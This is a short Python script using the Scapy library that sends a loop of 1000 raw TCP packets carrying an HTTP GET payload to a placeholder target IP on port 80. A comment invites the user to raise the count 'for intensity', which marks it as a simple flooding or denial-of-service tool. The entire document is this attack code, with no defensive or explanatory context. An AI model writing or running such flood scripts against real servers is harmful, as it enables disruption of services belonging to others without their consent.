from scapy.all import *

target_ip = "TARGET_IP"
target_port = 80

for i in range(1000):  # Adjust the range for intensity
    packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    send(packet)
